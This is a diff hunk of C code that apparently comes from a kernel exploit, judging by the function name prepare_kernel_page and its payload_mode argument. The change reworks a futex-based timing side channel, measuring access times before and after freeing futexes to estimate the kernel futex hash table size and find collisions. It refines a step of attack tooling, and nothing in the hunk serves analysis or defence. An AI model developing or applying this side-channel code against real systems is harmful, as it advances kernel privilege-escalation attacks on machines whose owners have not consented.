@@ -837,23 +837,30 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
       __increase(ks, 128, APPENDED_FUTEXES);
       usleep(300000);
       pr_info("[OVAL-P0] T tA=%zu tB=%zu (tA>=100 required for validity)\n", tA, tB);
-      /* P1: fraction of random addrs colliding = 1/true_hashsize */
-      size_t coll = 0, ntry = 0;
-      for (size_t i = 2; i < ks->total_futexes && ntry < 512; ++i) {
-        size_t id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
-        if (id >= FUTEX_SZ) break;
-        size_t c = (size_t)&ks->futexes[id];
+      /* P1: fraction = 1/true_hashsize; two-pass, pile resident (no thread churn) */
+      size_t P1N = 512;
+      static size_t p1a[512], p1b[512];
+      static size_t p1c[512];
+      size_t pn = 0;
+      for (size_t i2 = 2; i2 < ks->total_futexes && pn < P1N; ++i2) {
+        size_t id2 = (i2 * KS_PAGE_SIZE) | (i2 * 8 % KS_PAGE_SIZE);
+        if (id2 >= FUTEX_SZ) break;
+        size_t c = (size_t)&ks->futexes[id2];
         if (c == T) continue;
-        size_t a1 = __measure_raw(c);
-        __decrease(ks, 128);
-        size_t b1 = __measure_raw(c);
-        __increase(ks, 128, APPENDED_FUTEXES);
-        usleep(20000);
-        ntry++;
-        if (a1 > 3 * b1 + 8) coll++;
+        p1c[pn++] = c;
       }
-      pr_info("[OVAL-P1] coll=%zu/%zu -> true hashsize ~ %zu\n",
-              coll, ntry, ntry / (coll ? coll : 1));
+      for (size_t q = 0; q < pn; ++q) p1a[q] = __measure_raw(p1c[q]);
+      __decrease(ks, 128);
+      for (size_t q = 0; q < pn; ++q) p1b[q] = __measure_raw(p1c[q]);
+      {
+        size_t coll = 0;
+        for (size_t q = 0; q < pn; ++q)
+          if (p1a[q] > 3 * p1b[q] + 8) coll++;
+        pr_info("[OVAL-P1] coll=%zu/%zu -> true hashsize ~ %zu\n",
+                coll, pn, pn / (coll ? coll : 1));
+      }
+      __increase(ks, 128, APPENDED_FUTEXES);
+      usleep(300000);
       /* P2: same-offset next-page (T+4096): page-dependence */
       {
         size_t c = T + KS_PAGE_SIZE;
